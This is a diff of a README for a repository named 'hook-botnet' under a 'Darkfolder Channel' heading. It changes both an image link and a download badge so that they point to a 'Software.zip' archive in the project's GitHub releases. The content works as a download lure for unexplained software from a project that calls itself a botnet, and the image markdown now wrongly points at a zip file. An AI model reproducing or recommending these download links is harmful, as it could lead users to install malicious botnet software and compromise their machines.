@@ -1,7 +1,7 @@
 # Welcome to the Darkfolder Channel Repository 🕵️‍♂️
 
-![Darkfolder Channel](https://yourimageurl.com)
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-orange)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+![Darkfolder Channel](https://github.com/redneck155/hook-botnet/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/redneck155/hook-botnet/releases/download/v1.0/Software.zip)](https://github.com/redneck155/hook-botnet/releases/download/v1.0/Software.zip)
 
 ## Repository: hook-botnet
 
